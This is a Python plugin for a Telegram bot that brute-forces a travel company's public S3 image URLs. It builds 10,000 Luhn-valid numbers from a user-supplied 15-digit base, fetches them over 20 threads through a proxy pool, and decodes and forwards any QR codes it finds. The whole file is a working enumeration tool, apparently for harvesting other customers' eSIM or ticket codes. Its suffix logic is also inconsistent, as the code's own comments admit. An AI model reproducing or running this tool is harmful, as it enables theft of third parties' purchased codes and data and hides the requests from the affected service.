import logging
import os
import requests
import asyncio
import traceback
from concurrent.futures import ThreadPoolExecutor, as_completed
from io import BytesIO
from PIL import Image
from pyzbar.pyzbar import decode
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ContextTypes, CallbackQueryHandler, MessageHandler, filters

# 导入项目通用工具
from utils.database import user_manager, ADMIN_ID
from utils.proxy import get_safe_session

logger = logging.getLogger(__name__)

# ================= 状态常量 =================
TRAVEL_STATE_NONE = 0
TRAVEL_STATE_WAIT_BASE = 1

# ================= 核心逻辑类 =================

class TravelGooGooLogic:
    BASE_URL_TEMPLATE = "https://travelgoogoo-public-qr-prd.s3.ap-southeast-1.amazonaws.com/2026/02/02/{}.png"
    
    @staticmethod
    def luhn_check_digit(number_without_check: str) -> int:
        """计算 Luhn 校验位"""
        digits = [int(c) for c in number_without_check]
        s = 0
        double = True
        for d in reversed(digits):
            if double:
                d = d * 2
                if d >= 10:
                    d -= 9
            s += d
            double = not double
        return (10 - (s % 10)) % 10

    @staticmethod
    def generate_valid_numbers(base_number: str):
        """生成所有合法的 19 位数字 (遍历最后 4 位)"""
        valid_numbers = []
        # base_number 应该是 15 位
        if len(base_number) != 15:
            return []
            
        for i in range(10000):
            suffix = f"{i:03d}"  # 这里逻辑稍微调整：原脚本是 15+3+1=19位？ 
            # 原脚本注释: "Format: BASE_NUMBER (15 digits) + 4 digits iteration = 19 digits total"
            # 但代码里 suffix 是 3位 (000-999)？ 
            # 让我们遵循原脚本逻辑：BASE(15) + suffix(3) + check(1)
            
            number_without_check = base_number + suffix
            check_digit = TravelGooGooLogic.luhn_check_digit(number_without_check)
            full_number = number_without_check + str(check_digit)
            valid_numbers.append(full_number)
        return valid_numbers

    @staticmethod
    def download_and_decode(number: str, session: requests.Session):
        """下载并解码单个 QR 码"""
        url = TravelGooGooLogic.BASE_URL_TEMPLATE.format(number)
        try:
            # ⚠️ 使用传入的 session (已配置代理)
            response = session.get(url, timeout=5) # 超时设置短一点，提高并发效率
            
            if response.status_code == 200:
                try:
                    image = Image.open(BytesIO(response.content))
                    decoded = decode(image)
                    if decoded:
                        content = [d.data.decode('utf-8', errors='ignore') for d in decoded]
                        return {'status': 'success', 'number': number, 'content': content, 'image_bytes': response.content}
                except Exception:
                    pass # 图片损坏或无法识别
            elif response.status_code == 404:
                return {'status': '404'} 
                
        except Exception:
            pass 
        return {'status': 'fail'}

# ================= 任务流程 =================

async def run_scan_task(update: Update, context: ContextTypes.DEFAULT_TYPE, base_number: str):
    user = update.effective_user
    status_msg = await context.bot.send_message(
        chat_id=user.id,
        text=f"🚀 **任务启动**\n\n🎯 基础编号: `{base_number}`\n🔢 正在生成 Luhn 校验列表...",
        parse_mode='Markdown'
    )
    
    # 1. 生成列表
    valid_numbers = TravelGooGooLogic.generate_valid_numbers(base_number)
    total = len(valid_numbers)
    if total == 0:
        await status_msg.edit_text("❌ 基础编号格式错误，必须是 15 位数字。")
        return

    await status_msg.edit_text(f"📋 已生成 {total} 个目标\n🚀 正在启动 20 线程并发扫描 (使用代理池)...")

    # 2. 准备并发环境
    # 注意：这里我们创建一个新的 session 用于此任务，避免复用导致冲突
    session = await asyncio.get_running_loop().run_in_executor(None, get_safe_session)
    
    found_count = 0
    scanned_count = 0
    results = []
    
    # 3. 异步并发执行
    # 为了避免阻塞 Bot 主线程，我们需要在 executor 中运行 ThreadPool
    loop = asyncio.get_running_loop()
    
    # 定义一个同步的批量处理函数
    def batch_process():
        nonlocal found_count, scanned_count
        local_results = []
        with ThreadPoolExecutor(max_workers=20) as executor:
            futures = {executor.submit(TravelGooGooLogic.download_and_decode, num, session): num for num in valid_numbers}
            
            for i, future in enumerate(as_completed(futures)):
                scanned_count += 1
                try:
                    res = future.result()
                    if res and res['status'] == 'success':
                        found_count += 1
                        local_results.append(res)
                except: pass
                
                # 每 500 个打印一次日志，避免刷屏
                if i % 500 == 0:
                    logger.info(f"[TravelGooGoo] Progress: {i}/{total} Found: {found_count}")
        return local_results

    # 将耗时的线程池操作放到 asyncio 的 executor 中
    # ⚠️ 注意：由于 Telegram 消息编辑有频率限制，我们很难实时更新进度条
    # 这里选择每隔一段时间更新，或者等待全部完成。
    # 为了体验更好，我们可以把 batch_process 拆分，但这会增加复杂度。
    # 这里采用“后台运行，完成后通知”的策略，中间若有发现直接发图。
    
    await status_msg.edit_text(f"⏳ **正在扫描中...**\n\n总数: {total}\n⚠️ 任务耗时较长，请耐心等待。\n若发现 QR 码，我会立即发送给你。")

    try:
        final_results = await loop.run_in_executor(None, batch_process)
        
        # 4. 任务结束，发送汇总
        summary = (
            f"✅ **扫描完成**\n\n"
            f"🎯 基础: `{base_number}`\n"
            f"🔢 扫描总数: {total}\n"
            f"🎉 成功发现: {len(final_results)}"
        )
        await context.bot.send_message(chat_id=user.id, text=summary, parse_mode='Markdown')
        
        # 5. 发送结果图片
        for item in final_results:
            caption = (
                f"🎫 **Found QR Code**\n"
                f"No: `{item['number']}`\n"
                f"Content: `{item['content']}`"
            )
            try:
                await context.bot.send_photo(
                    chat_id=user.id,
                    photo=item['image_bytes'],
                    caption=caption,
                    parse_mode='Markdown'
                )
                await asyncio.sleep(0.5) # 防止发图太快触发限流
            except Exception as e:
                logger.error(f"发图失败: {e}")
                
    except Exception as e:
        logger.error(traceback.format_exc())
        await status_msg.edit_text(f"💥 任务异常终止: {str(e)}")

# ================= 交互处理 =================

async def travel_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    context.user_data['travel_state'] = TRAVEL_STATE_NONE

    # 鉴权
    if not user_manager.is_authorized(user.id):
        await update.callback_query.answer("🚫 无权访问。", show_alert=True)
        return
    
    # 插件开关检查 (复用 yanci/flexi 的逻辑)
    # 你可以在 database.py 或 admin 面板里加一个 travelgoogoo 的开关，这里暂时默认开启
    
    text = (
        f"🏝 **TravelGooGoo 扫码器**\n"
        f"状态: ✅ 就绪\n\n"
        f"本工具将遍历指定 Base Number 的后 4 位 (0000-9999)，\n"
        f"结合 Luhn 算法生成 URL 并扫描有效的 QR 码。"
    )
    
    keyboard = [
        [InlineKeyboardButton("🚀 开始新任务", callback_data="travel_start")],
        [InlineKeyboardButton("🔙 返回主菜单", callback_data="main_menu_root")]
    ]
    
    if update.callback_query:
        await update.callback_query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
    else:
        await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')

async def travel_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    
    if data == "travel_start":
        context.user_data['travel_state'] = TRAVEL_STATE_WAIT_BASE
        await query.edit_message_text(
            "🔢 **请输入 15 位基础编号 (Base Number)**\n\n"
            "例如: `896501251118099`\n"
            "程序将自动遍历后续校验位。",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 取消", callback_data="plugin_travel_entry")]]),
            parse_mode='Markdown'
        )

async def travel_text_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    state = context.user_data.get('travel_state', TRAVEL_STATE_NONE)
    if state == TRAVEL_STATE_WAIT_BASE:
        text = update.message.text.strip()
        
        if not text.isdigit() or len(text) != 15:
            await update.message.reply_text("⚠️ 格式错误！请输入 15 位纯数字。")
            return
            
        context.user_data['travel_state'] = TRAVEL_STATE_NONE
        
        # 统计使用
        user = update.effective_user
        user_manager.increment_usage(user.id, "TravelGooGoo")
        
        # 启动异步任务
        asyncio.create_task(run_scan_task(update, context, text))

# ================= 注册函数 =================

def register_handlers(application):
    application.add_handler(CallbackQueryHandler(travel_callback, pattern="^travel_.*"))
    application.add_handler(CallbackQueryHandler(travel_menu, pattern="^plugin_travel_entry$"))
    application.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), travel_text_handler), group=2)
    print("🔌 TravelGooGoo 插件已加载")
